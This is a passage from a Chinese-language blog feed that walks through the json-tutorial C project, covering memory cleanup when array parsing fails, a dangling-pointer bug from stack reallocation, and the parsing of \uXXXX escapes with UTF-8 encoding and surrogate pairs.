class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lept_free</span><span class="params">(lept_value* v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> i;</span><br><span class="line">    assert(v != <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">switch</span> (v-&gt;type) &#123;</span><br><span class="line">        <span class="keyword">case</span> LEPT_STRING:</span><br><span class="line">            <span class="built_in">free</span>(v-&gt;u.s.s);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> LEPT_ARRAY:</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; v-&gt;u.a.size; i++)</span><br><span class="line">                lept_free(&amp;v-&gt;u.a.e[i]);</span><br><span class="line">            <span class="built_in">free</span>(v-&gt;u.a.e);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>: <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v-&gt;type = LEPT_NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改之后，再运行内存泄漏检测工具，确保问题已被修正。</p><ol start="4"><li>开启 test.c 中两处被 <code>#if 0 ... #endif</code> 关闭的测试，本来 <code>lept_parse_array()</code> 已经能处理这些测试。然而，运行时会发现 <code>Assertion failed: (c.top == 0)</code> 断言失败。这是由于，当错误发生时，仍然有一些临时值在堆栈里，既没有放进数组，也没有被释放。修改 <code>lept_parse_array()</code>，当遇到错误时，从堆栈中弹出并释放那些临时值，然后才返回错误码。</li></ol><p>遇到解析错误时，我们可能在之前已压入了一些值在自定义堆栈上。如果没有处理，最后会在 <code>lept_parse()</code> 中发现堆栈上还有一些值，做成断言失败。所以，遇到解析错误时，我们必须弹出并释放那些值。</p><p>在 <code>lept_parse_array</code> 中，原本遇到解析失败时，会直接返回错误码。我们把它改为 <code>break</code> 离开循环，在循环结束后的地方用 <code>lept_free()</code> 释放从堆栈弹出的值，然后才返回错误码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lept_parse_array</span><span class="params">(lept_context* c, lept_value* v)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">/* ... */</span></span><br><span class="line">        <span class="keyword">if</span> ((ret = lept_parse_value(c, &amp;e)) != LEPT_PARSE_OK)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">/* ... */</span></span><br><span class="line">        <span class="keyword">if</span> (*c-&gt;json == <span class="string">&#x27;,&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">/* ... */</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (*c-&gt;json == <span class="string">&#x27;]&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">/* ... */</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            ret = LEPT_PARSE_MISS_COMMA_OR_SQUARE_BRACKET;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Pop and free values on the stack */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        lept_free((lept_value*)lept_context_pop(c, <span class="keyword">sizeof</span>(lept_value)));</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>第 4 节那段代码为什么会有 bug？</li></ol><p>这个 bug 源于压栈时，会获得一个指针 <code>e</code>，指向从堆栈分配到的空间：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="comment">/* bug! */</span></span><br><span class="line">    lept_value* e = lept_context_push(c, <span class="keyword">sizeof</span>(lept_value));</span><br><span class="line">    lept_init(e);</span><br><span class="line">    size++;</span><br><span class="line">    <span class="keyword">if</span> ((ret = lept_parse_value(c, e)) != LEPT_PARSE_OK)</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，我们把这个指针调用 <code>lept_parse_value(c, e)</code>，这里会出现问题，因为 <code>lept_parse_value()</code> 及之下的函数都需要调用 <code>lept_context_push()</code>，而 <code>lept_context_push()</code> 在发现栈满了的时候会用 <code>realloc()</code> 扩容。这时候，我们上层的 <code>e</code> 就会失效，变成一个悬挂指针（dangling pointer），而且 <code>lept_parse_value(c, e)</code> 会通过这个指针写入解析结果，造成非法访问。</p><p>在使用 C++ 容器时，也会遇到类似的问题。从容器中取得的迭代器（iterator）后，如果改动容器内容，之前的迭代器会失效。这里的悬挂指针问题也是相同的。</p><p>但这种 bug 有时可能在简单测试中不能自动发现，因为问题只有堆栈满了才会出现。从测试的角度看，我们需要一些压力测试（stress test），测试更大更复杂的数据。但从编程的角度看，我们要谨慎考虑变量的生命周期，尽量从编程阶段避免出现问题。例如把 <code>lept_context_push()</code> 的 API 改为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">lept_context_push</span><span class="params">(lept_context* c, <span class="keyword">const</span> <span class="keyword">void</span>* data, <span class="keyword">size_t</span> size)</span></span>;</span><br></pre></td></tr></table></figure><p>这样就确把数据压入栈内，避免了返回指针的生命周期问题。但我们之后会发现，原来的 API 设计在一些情况会更方便一些，例如在把字符串值转化（stringify）为 JSON 时，我们可以预先在堆栈分配字符串所需的最大空间，而当时是未有数据填充进去的。</p><p>无论如何，我们编程时都要考虑清楚变量的生命周期，特别是指针的生命周期。</p><p>经过对数组的解析，我们也了解到如何利用递归处理复合型的数据类型解析。与一些用链表或自动扩展的动态数组的实现比较，我们利用了自定义堆栈作为缓冲区，能分配最紧凑的数组作存储之用，会比其他实现更省内存。我们完成了数组类型后，只余下对象类型了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;跟着github上的项目json-tutorial完成一个json解析器。本文对应该项目的第四单元，重点在解析\uXXXX类型的字符串。&lt;/p&gt;</summary>
    
    
    
    <category term="项目" scheme="https://www.fvolcano.red/categories/%E9%A1%B9%E7%9B%AE/"/>
    
    
    <category term="json" scheme="https://www.fvolcano.red/tags/json/"/>
    
  </entry>
  
  <entry>
    <title>跟着做一个JSON解析器（四）</title>
    <link href="https://www.fvolcano.red/2021/Make-a-JSON-parser-4/"/>
    <id>https://www.fvolcano.red/2021/Make-a-JSON-parser-4/</id>
    <published>2021-08-06T22:42:43.000Z</published>
    <updated>2021-08-06T22:42:43.000Z</updated>
    
    <content type="html"><![CDATA[<p>跟着github上的项目json-tutorial完成一个json解析器。本文对应该项目的第四单元，重点在解析\uXXXX类型的字符串。<a id="more"></a></p><p>👉<a href="https://github.com/miloyip/json-tutorial">原项目地址</a></p><h1 id="一、Unicode"><a href="#一、Unicode" class="headerlink" title="一、Unicode"></a>一、Unicode</h1><p>在上一个单元，我们已经能解析「一般」的 JSON 字符串，仅仅没有处理 <code>\uXXXX</code> 这种转义序列。为了解析这种序列，我们必须了解有关 Unicode 的基本概念。</p><p>读者应该知道 ASCII，它是一种字符编码，把 128 个字符映射至整数 0 ~ 127。例如，<code>1</code> → 49，<code>A</code> → 65，<code>B</code> → 66 等等。这种 7-bit 字符编码系统非常简单，在计算机中以一个字节存储一个字符。然而，它仅适合美国英语，甚至一些英语中常用的标点符号、重音符号都不能表示，无法表示各国语言，特别是中日韩语等表意文字。</p><p>在 Unicode 出现之前，各地区制定了不同的编码系统，如中文主要用 GB 2312 和大五码、日文主要用 JIS 等。这样会造成很多不便，例如一个文本信息很难混合各种语言的文字。</p><p>因此，在上世纪80年代末，Xerox、Apple 等公司开始研究，是否能制定一套多语言的统一编码系统。后来，多个机构成立了 Unicode 联盟，在 1991 年释出 Unicode 1.0，收录了 24 种语言共 7161 个字符。在四分之一个世纪后的 2016年，Unicode 已释出 9.0 版本，收录 135 种语言共 128237 个字符。</p><p>这些字符被收录为统一字符集（Universal Coded Character Set, UCS），每个字符映射至一个整数码点（code point），码点的范围是 0 至 0x10FFFF，码点又通常记作 U+XXXX，当中 XXXX 为 16 进位数字。例如 <code>劲</code> → U+52B2、<code>峰</code> → U+5CF0。很明显，UCS 中的字符无法像 ASCII 般以一个字节存储。</p><p>因此，Unicode 还制定了各种储存码点的方式，这些方式称为 Unicode 转换格式（Uniform Transformation Format, UTF）。现时流行的 UTF 为 UTF-8、UTF-16 和 UTF-32。每种 UTF 会把一个码点储存为一至多个编码单元（code unit）。例如 UTF-8 的编码单元是 8 位的字节、UTF-16 为 16 位、UTF-32 为 32 位。除 UTF-32 外，UTF-8 和 UTF-16 都是可变长度编码。</p><p>UTF-8 成为现时互联网上最流行的格式，有几个原因：</p><ol><li>它采用字节为编码单元，不会有字节序（endianness）的问题。</li><li>每个 ASCII 字符只需一个字节去储存。</li><li>如果程序原来是以字节方式储存字符，理论上不需要特别改动就能处理 UTF-8 的数据。</li></ol><h1 id="二、json需求"><a href="#二、json需求" class="headerlink" title="二、json需求"></a>二、json需求</h1><p>由于 UTF-8 的普及性，大部分的 JSON 也通常会以 UTF-8 存储。我们的 JSON 库也会只支持 UTF-8。（RapidJSON 同时支持 UTF-8、UTF-16LE/BE、UTF-32LE/BE、ASCII。）</p><p>C 标准库没有关于 Unicode 的处理功能（C++11 有），我们会实现 JSON 库所需的字符编码处理功能。</p><p>对于非转义（unescaped）的字符，只要它们不少于 32（0 ~ 31 是不合法的编码单元），我们可以直接复制至结果，这一点我们稍后再说明。我们假设输入是以合法 UTF-8 编码。</p><p>而对于 JSON字符串中的 <code>\uXXXX</code> 是以 16 进制表示码点 U+0000 至 U+FFFF，我们需要：</p><ol><li>解析 4 位十六进制整数为码点；</li><li>由于字符串是以 UTF-8 存储，我们要把这个码点编码成 UTF-8。</li></ol><p>同学可能会发现，4 位的 16 进制数字只能表示 0 至 0xFFFF，但之前我们说 UCS 的码点是从 0 至 0x10FFFF，那怎么能表示多出来的码点？</p><p>其实，U+0000 至 U+FFFF 这组 Unicode 字符称为基本多文种平面（basic multilingual plane, BMP），还有另外 16 个平面。那么 BMP 以外的字符，JSON 会使用代理对（surrogate pair）表示 <code>\uXXXX\uYYYY</code>。在 BMP 中，保留了 2048 个代理码点。如果第一个码点是 U+D800 至 U+DBFF，我们便知道它的代码对的高代理项（high surrogate），之后应该伴随一个 U+DC00 至 U+DFFF 的低代理项（low surrogate）。然后，我们用下列公式把代理对 (H, L) 变换成真实的码点：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">codepoint</span> = <span class="number">0</span>x<span class="number">10000</span> + (H − <span class="number">0</span>xD<span class="number">800</span>) × <span class="number">0</span>x<span class="number">400</span> + (L − <span class="number">0</span>xDC<span class="number">00</span>)</span><br></pre></td></tr></table></figure><p>举个例子，高音谱号字符 <code>𝄞</code> → U+1D11E 不是 BMP 之内的字符。在 JSON 中可写成转义序列 <code>\uD834\uDD1E</code>，我们解析第一个 <code>\uD834</code> 得到码点 U+D834，我们发现它是 U+D800 至 U+DBFF 内的码点，所以它是高代理项。然后我们解析下一个转义序列 <code>\uDD1E</code> 得到码点 U+DD1E，它在 U+DC00 至 U+DFFF 之内，是合法的低代理项。我们计算其码点：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">H = <span class="number">0xD834</span>, L = <span class="number">0xDD1E</span></span><br><span class="line">codepoint = <span class="number">0x10000</span> + (H − <span class="number">0xD800</span>) × <span class="number">0x400</span> + (L − <span class="number">0xDC00</span>)</span><br><span class="line">          = <span class="number">0x10000</span> + (<span class="number">0xD834</span> - <span class="number">0xD800</span>) × <span class="number">0x400</span> + (<span class="number">0xDD1E</span> − <span class="number">0xDC00</span>)</span><br><span class="line">          = <span class="number">0x10000</span> + <span class="number">0x34</span> × <span class="number">0x400</span> + <span class="number">0x11E</span></span><br><span class="line">          = <span class="number">0x10000</span> + <span class="number">0xD000</span> + <span class="number">0x11E</span></span><br><span class="line">          = <span class="number">0x1D11E</span></span><br></pre></td></tr></table></figure><p>这样就得出这转义序列的码点，然后我们再把它编码成 UTF-8。如果只有高代理项而欠缺低代理项，或是低代理项不在合法码点范围，我们都返回 <code>LEPT_PARSE_INVALID_UNICODE_SURROGATE</code> 错误。如果 <code>\u</code> 后不是 4 位十六进位数字，则返回 <code>LEPT_PARSE_INVALID_UNICODE_HEX</code> 错误。</p><h1 id="三、UTF-8编码"><a href="#三、UTF-8编码" class="headerlink" title="三、UTF-8编码"></a>三、UTF-8编码</h1><p>UTF-8 在网页上的使用率势无可挡：</p><p><img src="/2021/Make-a-JSON-parser-4/Utf8webgrowth.png" alt=" "></p><p>（图片来自 <a href="https://commons.wikimedia.org/wiki/File:Utf8webgrowth.svg">Wikipedia Common</a>，数据来自 Google 对网页字符编码的统计。）</p><p>由于我们的 JSON 库也只支持 UTF-8，我们需要把码点编码成 UTF-8。这里简单介绍一下 UTF-8 的编码方式。</p><p>UTF-8 的编码单元为 8 位（1 字节），每个码点编码成 1 至 4 个字节。它的编码方式很简单，按照码点的范围，把码点的二进位分拆成 1 至最多 4 个字节：</p><table><thead><tr><th>码点范围</th><th>码点位数</th><th>字节1</th><th>字节2</th><th>字节3</th><th>字节4</th></tr></thead><tbody><tr><td>U+0000 ~ U+007F</td><td>7</td><td>0xxxxxxx</td><td></td><td></td><td></td></tr><tr><td>U+0080 ~ U+07FF</td><td>11</td><td>110xxxxx</td><td>10xxxxxx</td><td></td><td></td></tr><tr><td>U+0800 ~ U+FFFF</td><td>16</td><td>1110xxxx</td><td>10xxxxxx</td><td>10xxxxxx</td><td></td></tr><tr><td>U+10000 ~ U+10FFFF</td><td>21</td><td>11110xxx</td><td>10xxxxxx</td><td>10xxxxxx</td><td>10xxxxxx</td></tr></tbody></table><p>这个编码方法的好处之一是，码点范围 U+0000 ~ U+007F 编码为一个字节，与 ASCII 编码兼容。这范围的 Unicode 码点也是和 ASCII 字符相同的。因此，一个 ASCII 文本也是一个 UTF-8 文本。</p><p>我们举一个例子解析多字节的情况，欧元符号 <code>€</code> → U+20AC：</p><ol><li>U+20AC 在 U+0800 ~ U+FFFF 的范围内，应编码成 3 个字节。</li><li>U+20AC 的二进位为 10000010101100</li><li>3 个字节的情况我们要 16 位的码点，所以在前面补两个 0，成为 0010000010101100</li><li>按上表把二进位分成 3 组：0010, 000010, 101100</li><li>加上每个字节的前缀：11100010, 10000010, 10101100</li><li>用十六进位表示即：0xE2, 0x82, 0xAC</li></ol><p>对于这例子的范围，对应的 C 代码是这样的：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (u &gt;= <span class="number">0x0800</span> &amp;&amp; u &lt;= <span class="number">0xFFFF</span>) &#123;</span><br><span class="line">    OutputByte(<span class="number">0xE0</span> | ((u &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xFF</span>)); <span class="comment">/* 0xE0 = 11100000 */</span></span><br><span class="line">    OutputByte(<span class="number">0x80</span> | ((u &gt;&gt;  <span class="number">6</span>) &amp; <span class="number">0x3F</span>)); <span class="comment">/* 0x80 = 10000000 */</span></span><br><span class="line">    OutputByte(<span class="number">0x80</span> | ( u        &amp; <span class="number">0x3F</span>)); <span class="comment">/* 0x3F = 00111111 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>UTF-8 的解码稍复杂一点，但我们的 JSON 库不会校验 JSON 文本是否符合 UTF-8，所以这里也不展开了。</p><h1 id="四、实现-uXXXX-解析"><a href="#四、实现-uXXXX-解析" class="headerlink" title="四、实现 \uXXXX 解析"></a>四、实现 <code>\uXXXX</code> 解析</h1><p>我们只需要在其它转义符的处理中加入对 <code>\uXXXX</code> 的处理：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lept_parse_string</span><span class="params">(lept_context* c, lept_value* v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> u;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">char</span> ch = *p++;</span><br><span class="line">        <span class="keyword">switch</span> (ch) &#123;</span><br><span class="line">            <span class="comment">/* ... */</span></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;\\&#x27;</span>:</span><br><span class="line">                <span class="keyword">switch</span> (*p++) &#123;</span><br><span class="line">                    <span class="comment">/* ... */</span></span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>:</span><br><span class="line">                        <span class="keyword">if</span> (!(p = lept_parse_hex4(p, &amp;u)))</span><br><span class="line">                            STRING_ERROR(LEPT_PARSE_INVALID_UNICODE_HEX);</span><br><span class="line">                        <span class="comment">/* \TODO surrogate handling */</span></span><br><span class="line">                        lept_encode_utf8(c, u);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="comment">/* ... */</span></span><br><span class="line">                &#125;</span><br><span class="line">            <span class="comment">/* ... */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码的过程很简单，遇到 <code>\u</code> 转义时，调用 <code>lept_parse_hex4()</code> 解析 4 位十六进数字，存储为码点 <code>u</code>。这个函数在成功时返回解析后的文本指针，失败返回 <code>NULL</code>。如果失败，就返回 <code>LEPT_PARSE_INVALID_UNICODE_HEX</code> 错误。最后，把码点编码成 UTF-8，写进缓冲区。这里没有处理代理对，留作练习。</p><p>顺带一提，我为 <code>lept_parse_string()</code> 做了个简单的重构，把返回错误码的处理抽取为宏：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STRING_ERROR(ret) do &#123; c-&gt;top = head; return ret; &#125; while(0)</span></span><br></pre></td></tr></table></figure><h1 id="五、总结与练习答案"><a href="#五、总结与练习答案" class="headerlink" title="五、总结与练习答案"></a>五、总结与练习答案</h1><p>本单元介绍了 Unicode 的基本知识，同学应该了解到一些常用的 Unicode 术语，如码点、编码单元、UTF-8、代理对等。这次的练习代码只有个空壳，要由同学填充。完成后应该能通过所有单元测试，届时我们的 JSON 字符串解析就完全符合标准了。</p><ol><li>实现 <code>lept_parse_hex4()</code>，不合法的十六进位数返回 <code>LEPT_PARSE_INVALID_UNICODE_HEX</code>。</li></ol><p>这个函数只是读 4 位 16 进制数字，可以简单地自行实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">lept_parse_hex4</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p, <span class="keyword">unsigned</span>* u)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    *u = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">char</span> ch = *p++;</span><br><span class="line">        *u &lt;&lt;= <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">if</span>      (ch &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;9&#x27;</span>)  *u |= ch - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (ch &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;F&#x27;</span>)  *u |= ch - (<span class="string">&#x27;A&#x27;</span> - <span class="number">10</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (ch &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;f&#x27;</span>)  *u |= ch - (<span class="string">&#x27;a&#x27;</span> - <span class="number">10</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可能有同学想到用标准库的 <a href="https://en.cppreference.com/w/c/string/byte/strtol"><code>strtol()</code></a>，因为它也能解析 16 进制数字，那么可以简短的写成：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">lept_parse_hex4</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p, <span class="keyword">unsigned</span>* u)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* end;</span><br><span class="line">    *u = (<span class="keyword">unsigned</span>)strtol(p, &amp;end, <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> end == p + <span class="number">4</span> ? end : <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但这个实现会错误地接受 <code>&quot;\u 123&quot;</code> 这种不合法的 JSON，因为 <code>strtol()</code> 会跳过开始的空白。要解决的话，还需要检测第一个字符是否 <code>[0-9A-Fa-f]</code>，或者 <code>!isspace(*p)</code>。但为了 <code>strtol()</code> 做多余的检测，而且自行实现也很简单，我个人会选择首个方案。（前两个单元用 <code>strtod()</code> 就没办法，因为它的实现要复杂得多。）</p><ol start="2"><li>按第 3 节谈到的 UTF-8 编码原理，实现 <code>lept_encode_utf8()</code>。这函数假设码点在正确范围 U+0000 ~ U+10FFFF（用断言检测）。</li></ol><p>这个函数只需要根据那个 UTF-8 编码表就可以实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">lept_encode_utf8</span><span class="params">(lept_context* c, <span class="keyword">unsigned</span> u)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (u &lt;= <span class="number">0x7F</span>) </span><br><span class="line">        PUTC(c, u &amp; <span class="number">0xFF</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (u &lt;= <span class="number">0x7FF</span>) &#123;</span><br><span class="line">        PUTC(c, <span class="number">0xC0</span> | ((u &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0xFF</span>));</span><br><span class="line">        PUTC(c, <span class="number">0x80</span> | ( u       &amp; <span class="number">0x3F</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (u &lt;= <span class="number">0xFFFF</span>) &#123;</span><br><span class="line">        PUTC(c, <span class="number">0xE0</span> | ((u &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xFF</span>));</span><br><span class="line">        PUTC(c, <span class="number">0x80</span> | ((u &gt;&gt;  <span class="number">6</span>) &amp; <span class="number">0x3F</span>));</span><br><span class="line">        PUTC(c, <span class="number">0x80</span> | ( u        &amp; <span class="number">0x3F</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        assert(u &lt;= <span class="number">0x10FFFF</span>);</span><br><span class="line">        PUTC(c, <span class="number">0xF0</span> | ((u &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0xFF</span>));</span><br><span class="line">        PUTC(c, <span class="number">0x80</span> | ((u &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x3F</span>));</span><br><span class="line">        PUTC(c, <span class="number">0x80</span> | ((u &gt;&gt;  <span class="number">6</span>) &amp; <span class="number">0x3F</span>));</span><br><span class="line">        PUTC(c, <span class="number">0x80</span> | ( u        &amp; <span class="number">0x3F</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有同学可能觉得奇怪，最终也是写进一个 <code>char</code>，为什么要做 <code>x &amp; 0xFF</code> 这种操作呢？这是因为 <code>u</code> 是 <code>unsigned</code> 类型，一些编译器可能会警告这个转型可能会截断数据。但实际上，配合了范围的检测然后右移之后，可以保证写入的是 0~255 内的值。为了避免一些编译器的警告误判，我们加上 <code>x &amp; 0xFF</code>。一般来说，编译器在优化之后，这与操作是会被消去的，不会影响性能。</p><p>其实超过 1 个字符输出时，可以只调用 1 次 <code>lept_context_push()</code>。这里全用 <code>PUTC()</code> 只是为了代码看上去简单一点。</p><ol start="3"><li>加入对代理对的处理，不正确的代理对范围要返回 <code>LEPT_PARSE_INVALID_UNICODE_SURROGATE</code> 错误。</li></ol><p>遇到高代理项，就需要把低代理项 <code>\uxxxx</code> 也解析进来，然后用这两个项去计算出码点：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> (!(p = lept_parse_hex4(p, &amp;u)))</span><br><span class="line">        STRING_ERROR(LEPT_PARSE_INVALID_UNICODE_HEX);</span><br><span class="line">    <span class="keyword">if</span> (u &gt;= <span class="number">0xD800</span> &amp;&amp; u &lt;= <span class="number">0xDBFF</span>) &#123; <span class="comment">/* surrogate pair */</span></span><br><span class="line">        <span class="keyword">if</span> (*p++ != <span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">            STRING_ERROR(LEPT_PARSE_INVALID_UNICODE_SURROGATE);</span><br><span class="line">        <span class="keyword">if</span> (*p++ != <span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">            STRING_ERROR(LEPT_PARSE_INVALID_UNICODE_SURROGATE);</span><br><span class="line">        <span class="keyword">if</span> (!(p = lept_parse_hex4(p, &amp;u2)))</span><br><span class="line">            STRING_ERROR(LEPT_PARSE_INVALID_UNICODE_HEX);</span><br><span class="line">        <span class="keyword">if</span> (u2 &lt; <span class="number">0xDC00</span> || u2 &gt; <span class="number">0xDFFF</span>)</span><br><span class="line">            STRING_ERROR(LEPT_PARSE_INVALID_UNICODE_SURROGATE);</span><br><span class="line">        u = (((u - <span class="number">0xD800</span>) &lt;&lt; <span class="number">10</span>) | (u2 - <span class="number">0xDC00</span>)) + <span class="number">0x10000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    lept_encode_utf8(c, 